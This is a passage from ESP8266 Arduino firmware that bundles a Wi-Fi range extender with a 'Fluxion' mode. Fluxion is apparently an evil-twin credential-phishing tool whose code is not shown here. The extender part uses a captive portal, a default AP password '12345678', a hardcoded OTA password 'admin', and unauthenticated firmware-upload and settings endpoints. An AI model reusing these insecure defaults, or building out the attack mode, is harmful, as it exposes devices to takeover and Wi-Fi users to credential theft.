function confirmReboot(){if(confirm('Reboot?')){api('/api/reboot',{method:'POST'});toast('Rebooting...','info');setTimeout(()=>location.reload(),8000)}}
function fileSelected(input){const f=input.files[0];if(f){document.getElementById('file-name').textContent=f.name+' ('+Math.round(f.size/1024)+'KB)';document.getElementById('upload-btn').disabled=false}}
const ua=document.getElementById('upload-area');
['dragenter','dragover'].forEach(e=>ua.addEventListener(e,ev=>{ev.preventDefault();ua.classList.add('dragover')}));
['dragleave','drop'].forEach(e=>ua.addEventListener(e,ev=>{ev.preventDefault();ua.classList.remove('dragover')}));
ua.addEventListener('drop',e=>{const f=e.dataTransfer.files[0];if(f&&f.name.endsWith('.bin')){document.getElementById('fw-file').files=e.dataTransfer.files;fileSelected(document.getElementById('fw-file'))}});
function uploadFirmware(){
  const file=document.getElementById('fw-file').files[0];
  if(!file){toast('No file','error');return}
  const xhr=new XMLHttpRequest();const form=new FormData();form.append('firmware',file,file.name);
  document.getElementById('upload-progress-bar').style.display='block';document.getElementById('upload-status').style.display='block';document.getElementById('upload-btn').disabled=true;
  xhr.upload.addEventListener('progress',e=>{if(e.lengthComputable){const pct=Math.round((e.loaded/e.total)*100);document.getElementById('upload-progress').style.width=pct+'%';document.getElementById('upload-status').textContent='Uploading... '+pct+'%'}});
  xhr.addEventListener('load',()=>{if(xhr.status===200){document.getElementById('upload-status').textContent='Success! Rebooting...';document.getElementById('upload-status').style.color='var(--success)';toast('Firmware updated!','success');setTimeout(()=>location.reload(),8000)}else{document.getElementById('upload-status').textContent='Failed: '+xhr.responseText;document.getElementById('upload-status').style.color='var(--danger)';toast('Failed','error');document.getElementById('upload-btn').disabled=false}});
  xhr.addEventListener('error',()=>{document.getElementById('upload-status').textContent='Upload error.';document.getElementById('upload-status').style.color='var(--danger)';toast('Error','error');document.getElementById('upload-btn').disabled=false});
  xhr.open('POST','/api/ota');xhr.send(form);
}
refreshStatus();refreshClients();
statusTimer=setInterval(refreshStatus,5000);
setInterval(refreshClients,15000);
</script>
</body>
</html>
)rawliteral";

// ═══════════════════════════════════════════════════════════════
//              Range Extender EEPROM Functions
// ═══════════════════════════════════════════════════════════════

uint8_t ext_calcChecksum() {
  uint8_t cs = 0;
  uint8_t *p = (uint8_t *)&config;
  for (size_t i = 0; i < sizeof(Config) - 1; i++) {
    cs ^= p[i];
  }
  return cs;
}

void ext_defaultConfig() {
  memset(&config, 0, sizeof(Config));
  config.magic = EEPROM_MAGIC;
  strncpy(config.ap_ssid, "ESP8266", sizeof(config.ap_ssid) - 1);
  strncpy(config.ap_pass, "12345678", sizeof(config.ap_pass) - 1);
  config.ap_channel = 1;
  config.ap_hidden = false;
  strncpy(config.hostname, "NodeMCU", sizeof(config.hostname) - 1);
  config.sta_ssid[0] = '\0';
  config.sta_pass[0] = '\0';
  config.checksum = ext_calcChecksum();
}

void ext_loadConfig() {
  EEPROM.begin(EEPROM_SIZE);
  EEPROM.get(0, config);
  if (config.magic != EEPROM_MAGIC || config.checksum != ext_calcChecksum()) {
    Serial.println(F("[CONFIG] Invalid EEPROM data, loading defaults"));
    ext_defaultConfig();
    ext_saveConfig();
  } else {
    Serial.println(F("[CONFIG] Loaded from EEPROM"));
    Serial.printf("[CONFIG] AP SSID: %s\n", config.ap_ssid);
    Serial.printf("[CONFIG] STA SSID: %s\n", config.sta_ssid);
  }
}

void ext_saveConfig() {
  config.checksum = ext_calcChecksum();
  EEPROM.put(0, config);
  EEPROM.commit();
  Serial.println(F("[CONFIG] Saved to EEPROM"));
}

// ═══════════════════════════════════════════════════════════════
//              Range Extender WiFi Setup
// ═══════════════════════════════════════════════════════════════

void ext_setupAP() {
  IPAddress apIP(192, 168, 4, 1);
  IPAddress apGateway(192, 168, 4, 1);
  IPAddress apSubnet(255, 255, 255, 0);
  WiFi.softAPConfig(apIP, apGateway, apSubnet);

  bool result;
  if (strlen(config.ap_pass) >= 8) {
    result = WiFi.softAP(config.ap_ssid, config.ap_pass, config.ap_channel,
                         config.ap_hidden, 8);
  } else {
    result = WiFi.softAP(config.ap_ssid, nullptr, config.ap_channel,
                         config.ap_hidden, 8);
  }

  if (result) {
    Serial.printf("[AP] Started: %s on channel %d\n", config.ap_ssid,
                  config.ap_channel);
    Serial.printf("[AP] IP: %s\n", WiFi.softAPIP().toString().c_str());
  } else {
    Serial.println(F("[AP] Failed to start!"));
  }
}

void ext_connectToWiFi() {
  if (strlen(config.sta_ssid) == 0) {
    Serial.println(F("[STA] No SSID configured"));
    return;
  }
  Serial.printf("[STA] Connecting to: %s\n", config.sta_ssid);
  WiFi.hostname(config.hostname);
  WiFi.begin(config.sta_ssid, config.sta_pass);

  int tries = 0;
  while (WiFi.status() != WL_CONNECTED && tries < MAX_RECONNECT_TRIES) {
    delay(500);
    Serial.print(".");
    tries++;
    digitalWrite(STATUS_LED, !digitalRead(STATUS_LED));
  }

  if (WiFi.status() == WL_CONNECTED) {
    Serial.printf("\n[STA] Connected! IP: %s\n",
                  WiFi.localIP().toString().c_str());
    Serial.printf("[STA] Gateway: %s\n", WiFi.gatewayIP().toString().c_str());
    Serial.printf("[STA] DNS: %s\n", WiFi.dnsIP().toString().c_str());
    Serial.printf("[STA] RSSI: %d dBm\n", WiFi.RSSI());
    staConnected = true;
    digitalWrite(STATUS_LED, LOW);
    ext_startNAPT();
  } else {
    Serial.println(F("\n[STA] Connection failed!"));
    staConnected = false;
    digitalWrite(STATUS_LED, HIGH);
  }
}

void ext_startNAPT() {
  if (naptStarted)
    return;
  Serial.println(F("[NAPT] Initializing..."));
  err_t ret = ip_napt_init(NAPT_TABLE_SIZE, NAPT_PORT_MAP_SIZE);
  if (ret == ERR_OK) {
    ret = ip_napt_enable_no(SOFTAP_IF, 1);
    if (ret == ERR_OK) {
      naptStarted = true;
      Serial.println(F("[NAPT] Started successfully!"));
      WiFi.softAPDhcpServer().setDns(WiFi.dnsIP(0));
    } else {
      Serial.println(F("[NAPT] Enable failed!"));
    }
  } else {
    Serial.println(F("[NAPT] Init failed!"));
  }
}

// ═══════════════════════════════════════════════════════════════
//              Range Extender Web Server Handlers
// ═══════════════════════════════════════════════════════════════

void ext_handleRoot() { webServer.send_P(200, "text/html", EXT_HTML_PAGE); }

void ext_handleApiStatus() {
  String json = "{";
  json += "\"sta_connected\":" +
          String(WiFi.status() == WL_CONNECTED ? "true" : "false") + ",";
  json += "\"sta_ssid\":\"" +
          String(WiFi.status() == WL_CONNECTED ? WiFi.SSID() : "") + "\",";
  json += "\"sta_ip\":\"" + WiFi.localIP().toString() + "\",";
  json += "\"sta_gw\":\"" + WiFi.gatewayIP().toString() + "\",";
  json += "\"sta_dns\":\"" + WiFi.dnsIP().toString() + "\",";
  json += "\"rssi\":" + String(WiFi.RSSI()) + ",";
  json += "\"ap_ssid\":\"" + String(config.ap_ssid) + "\",";
  json += "\"ap_ip\":\"" + WiFi.softAPIP().toString() + "\",";
  json += "\"ap_channel\":" + String(config.ap_channel) + ",";
  json += "\"ap_hidden\":" + String(config.ap_hidden ? "true" : "false") + ",";
  json += "\"hostname\":\"" + String(config.hostname) + "\",";
  json += "\"napt\":" + String(naptStarted ? "true" : "false") + ",";
  json += "\"clients\":" + String(WiFi.softAPgetStationNum()) + ",";
  json += "\"uptime\":" + String(millis() / 1000) + ",";
  json += "\"free_heap\":" + String(ESP.getFreeHeap()) + ",";
  json += "\"chip_id\":\"" + String(ESP.getChipId(), HEX) + "\",";
  json += "\"flash_size\":\"" + String(ESP.getFlashChipRealSize() / 1024) +
          " KB\",";
  json += "\"sdk\":\"" + String(ESP.getSdkVersion()) + "\",";
  json += "\"cpu_freq\":" + String(ESP.getCpuFreqMHz()) + ",";
  json += "\"sketch_size\":\"" + String(ESP.getSketchSize() / 1024) + " KB / " +
          String(ESP.getFreeSketchSpace() / 1024) + " KB free\"";
  json += "}";
  webServer.send(200, "application/json", json);
}

void ext_handleApiScan() {
  int n = WiFi.scanNetworks();
  String json = "{\"networks\":[";
  for (int i = 0; i < n; i++) {
    if (i > 0)
      json += ",";
    json += "{";
    json += "\"ssid\":\"" + WiFi.SSID(i) + "\",";
    json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
    json += "\"channel\":" + String(WiFi.channel(i)) + ",";
    json +=
        "\"encryption\":\"" + getEncryptionType(WiFi.encryptionType(i)) + "\",";
    json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\"";
    json += "}";
  }
  json += "]}";
  WiFi.scanDelete();
  webServer.send(200, "application/json", json);
}

void ext_handleApiConnect() {
  if (webServer.method() != HTTP_POST) {
    webServer.send(405, "application/json",
                   "{\"success\":false,\"message\":\"Method not allowed\"}");
    return;
  }
  String ssid = webServer.arg("ssid");
  String pass = webServer.arg("pass");
  if (ssid.length() == 0) {
    webServer.send(400, "application/json",
                   "{\"success\":false,\"message\":\"SSID required\"}");
    return;
  }
  strncpy(config.sta_ssid, ssid.c_str(), sizeof(config.sta_ssid) - 1);
  config.sta_ssid[sizeof(config.sta_ssid) - 1] = '\0';
  strncpy(config.sta_pass, pass.c_str(), sizeof(config.sta_pass) - 1);
  config.sta_pass[sizeof(config.sta_pass) - 1] = '\0';
  ext_saveConfig();
  webServer.send(200, "application/json",
                 "{\"success\":true,\"message\":\"Connecting...\"}");
  delay(500);
  if (WiFi.status() == WL_CONNECTED) {
    WiFi.disconnect();
    naptStarted = false;
  }
  ext_connectToWiFi();
}

void ext_handleApiDisconnect() {
  WiFi.disconnect();
  naptStarted = false;
  staConnected = false;
  config.sta_ssid[0] = '\0';
  config.sta_pass[0] = '\0';
  ext_saveConfig();
  webServer.send(200, "application/json",
                 "{\"success\":true,\"message\":\"Disconnected\"}");
}

void ext_handleApiSettings() {
  if (webServer.method() != HTTP_POST) {
    webServer.send(405, "application/json",
                   "{\"success\":false,\"message\":\"Method not allowed\"}");
    return;
  }
  String ap_ssid = webServer.arg("ap_ssid");
  String ap_pass = webServer.arg("ap_pass");
  String ap_channel = webServer.arg("ap_channel");
  String hostname = webServer.arg("hostname");
  String ap_hidden = webServer.arg("ap_hidden");

  if (ap_ssid.length() > 0) {
    strncpy(config.ap_ssid, ap_ssid.c_str(), sizeof(config.ap_ssid) - 1);
    config.ap_ssid[sizeof(config.ap_ssid) - 1] = '\0';
  }
  if (ap_pass.length() >= 8 || ap_pass.length() == 0) {
    strncpy(config.ap_pass, ap_pass.c_str(), sizeof(config.ap_pass) - 1);
    config.ap_pass[sizeof(config.ap_pass) - 1] = '\0';
  }
  if (ap_channel.length() > 0) {
    int ch = ap_channel.toInt();
    if (ch >= 1 && ch <= 13)
      config.ap_channel = ch;
  }
  if (hostname.length() > 0) {
    strncpy(config.hostname, hostname.c_str(), sizeof(config.hostname) - 1);
    config.hostname[sizeof(config.hostname) - 1] = '\0';
  }
  config.ap_hidden = (ap_hidden == "1");
  ext_saveConfig();
  webServer.send(
      200, "application/json",
      "{\"success\":true,\"message\":\"Settings saved. Rebooting...\"}");
  delay(1000);
  ESP.restart();
}

void ext_handleApiClients() {
  struct station_info *info = wifi_softap_get_station_info();
  String json = "{\"clients\":[";
  bool first = true;
  while (info != nullptr) {
    if (!first)
      json += ",";
    json += "{";
    char mac[18];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X", info->bssid[0],
             info->bssid[1], info->bssid[2], info->bssid[3], info->bssid[4],
             info->bssid[5]);
    json += "\"mac\":\"" + String(mac) + "\",";
    IPAddress ip(info->ip.addr);
    json += "\"ip\":\"" + ip.toString() + "\"";
    json += "}";
    first = false;
    info = STAILQ_NEXT(info, next);
  }
  wifi_softap_free_station_info();
  json += "]}";
  webServer.send(200, "application/json", json);
}

void ext_handleApiReboot() {
  webServer.send(200, "application/json",
                 "{\"success\":true,\"message\":\"Rebooting...\"}");
  delay(500);
  ESP.restart();
}

void ext_handleResetMode() {
  saveMode(MODE_SELECTOR);
  webServer.send(200, "application/json",
                 "{\"success\":true,\"message\":\"Switching to selector...\"}");
  delay(1000);
  ESP.restart();
}

String getSignalQuality(int rssi) {
  if (rssi >= -50)
    return "Excellent";
  if (rssi >= -60)
    return "Good";
  if (rssi >= -70)
    return "Fair";
  return "Weak";
}

String getEncryptionType(uint8_t encType) {
  switch (encType) {
  case ENC_TYPE_WEP:
    return "WEP";
  case ENC_TYPE_TKIP:
    return "WPA";
  case ENC_TYPE_CCMP:
    return "WPA2";
  case ENC_TYPE_AUTO:
    return "AUTO";
  case ENC_TYPE_NONE:
    return "Open";
  default:
    return "Unknown";
  }
}

// ═══════════════════════════════════════════════════════════════
//              Range Extender Web Server Setup
// ═══════════════════════════════════════════════════════════════

void ext_setupWebServer() {
  webServer.on("/", ext_handleRoot);
  webServer.on("/index.html", ext_handleRoot);

  webServer.on("/api/status", ext_handleApiStatus);
  webServer.on("/api/scan", ext_handleApiScan);
  webServer.on("/api/connect", ext_handleApiConnect);
  webServer.on("/api/disconnect", ext_handleApiDisconnect);
  webServer.on("/api/settings", ext_handleApiSettings);
  webServer.on("/api/clients", ext_handleApiClients);
  webServer.on("/api/reboot", ext_handleApiReboot);
  webServer.on("/api/resetmode", HTTP_POST, ext_handleResetMode);

  // OTA endpoint
  webServer.on(
      "/api/ota", HTTP_POST,
      []() {
        webServer.send(Update.hasError() ? 500 : 200, "text/plain",
                       Update.hasError() ? "Update failed!"
                                         : "Update successful! Rebooting...");
        delay(1000);
        ESP.restart();
      },
      handleOTAUpload);

  // Captive portal
  webServer.onNotFound([]() {
    webServer.sendHeader("Location",
                         "http://" + WiFi.softAPIP().toString() + "/");
    webServer.send(302, "text/plain", "");
  });

  webServer.begin();
  Serial.println(F("[WEB] Server started on port 80"));
}

void ext_setupOTA() {
  ArduinoOTA.setHostname(config.hostname);
  ArduinoOTA.setPassword("admin");

  ArduinoOTA.onStart([]() { Serial.println(F("[OTA] Start")); });
  ArduinoOTA.onEnd([]() { Serial.println(F("\n[OTA] End")); });
  ArduinoOTA.onProgress([](unsigned int progress, unsigned int total) {
    Serial.printf("[OTA] Progress: %u%%\r", (progress / (total / 100)));
  });
  ArduinoOTA.onError([](ota_error_t error) {
    Serial.printf("[OTA] Error[%u]: ", error);
    if (error == OTA_AUTH_ERROR)
      Serial.println("Auth Failed");
    else if (error == OTA_BEGIN_ERROR)
      Serial.println("Begin Failed");
    else if (error == OTA_CONNECT_ERROR)
      Serial.println("Connect Failed");
    else if (error == OTA_RECEIVE_ERROR)
      Serial.println("Receive Failed");
    else if (error == OTA_END_ERROR)
      Serial.println("End Failed");
  });

  ArduinoOTA.begin();
  Serial.println(F("[OTA] Arduino OTA ready"));
}

// ── Range Extender Setup & Loop ──
void extenderSetup() {
  pinMode(STATUS_LED, OUTPUT);
  digitalWrite(STATUS_LED, HIGH);

  ext_loadConfig();

  WiFi.mode(WIFI_AP_STA);
  WiFi.setAutoReconnect(true);

  ext_setupAP();

  if (strlen(config.sta_ssid) > 0) {
    ext_connectToWiFi();
  }

  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  Serial.println(F("[DNS] Captive portal DNS started"));

  ext_setupWebServer();
  ext_setupOTA();

  Serial.println(F("\n[READY] Range Extender initialized!"));
  Serial.printf("[READY] Connect to '%s' and open http://%s\n", config.ap_ssid,
                WiFi.softAPIP().toString().c_str());
}

void extenderLoop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  ArduinoOTA.handle();

  unsigned long now = millis();
  if (strlen(config.sta_ssid) > 0 && WiFi.status() != WL_CONNECTED) {
    if (now - lastReconnectAttempt > 30000) {
      lastReconnectAttempt = now;
      Serial.println(F("[STA] Attempting reconnection..."));
      WiFi.begin(config.sta_ssid, config.sta_pass);
      staConnected = false;
      naptStarted = false;
    }
    digitalWrite(STATUS_LED, (now / 500) % 2);
  } else if (WiFi.status() == WL_CONNECTED && !staConnected) {
    staConnected = true;
    ext_startNAPT();
    digitalWrite(STATUS_LED, LOW);
  }
}

// ═══════════════════════════════════════════════════════════════
// ████████████████████  MAIN SETUP & LOOP  ████████████████████
// ═══════════════════════════════════════════════════════════════

void setup() {
  Serial.begin(115200);
  Serial.println();
  Serial.println(F("╔══════════════════════════════════════╗"));
  Serial.println(F("║   ESP8266 Combined Firmware          ║"));
  Serial.println(F("║   Fluxion + Range Extender           ║"));
  Serial.println(F("║   SA SUJON                           ║"));
  Serial.println(F("╚══════════════════════════════════════╝"));

  EEPROM.begin(EEPROM_SIZE);
  activeMode = loadMode();

  switch (activeMode) {
  case MODE_FLUXION:
    Serial.println(F("[BOOT] Starting FLUXION mode..."));
    fluxionSetup();
    break;
  case MODE_EXTENDER:
    Serial.println(F("[BOOT] Starting RANGE EXTENDER mode..."));
    extenderSetup();
    break;
  default:
    Serial.println(F("[BOOT] Starting SELECTOR UI..."));
    selectorSetup();
    break;
  }
}

void loop() {
  switch (activeMode) {
  case MODE_FLUXION:
    fluxionLoop();
    break;
  case MODE_EXTENDER:
    extenderLoop();
    break;
  default:
    selectorLoop();
    break;
  }
}
